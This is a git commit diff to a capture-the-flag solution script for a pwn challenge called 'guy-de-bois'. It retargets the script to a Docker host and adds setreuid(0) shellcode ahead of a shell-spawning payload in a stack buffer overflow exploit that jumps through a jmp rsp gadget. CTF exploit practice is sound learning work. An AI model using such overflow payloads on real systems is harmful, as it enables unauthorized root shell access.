48e5d4371f49da39ba70361e1aafe6da8aa40079
s3nn <s3nn@users.noreply.github.com>
2020-02-22 21:53:44 +0200

    Update sol_s3nn.py

--- pwn/guy-de-bois/setup/sol_s3nn.py
+++ pwn/guy-de-bois/setup/sol_s3nn.py
@@ -6,10 +6,10 @@ binary = './chall'
 elf = ELF(binary)
 context.binary = binary
 PROCESS = [binary]
-context.terminal = ['tilix', '-a', 'app-new-session', '-e']
+# context.terminal = ['tilix', '-a', 'app-new-session', '-e']
 
-HOST = '127.0.0.1'
-PORT = 31337
+HOST = 'host.docker.internal'
+PORT = 2000
 
 
 def run():
@@ -34,6 +34,7 @@ OFFSET = cyclic_find(0x6161616161616170, n=8)  # cyclic(256, n=8)
 
 payload = 'A' * OFFSET
 payload += p64(JMP_RSP)
+payload += asm(shellcraft.amd64.linux.setreuid(0))
 payload += asm(shellcraft.sh())
 log.info(repr(payload))
 r.sendline(payload)
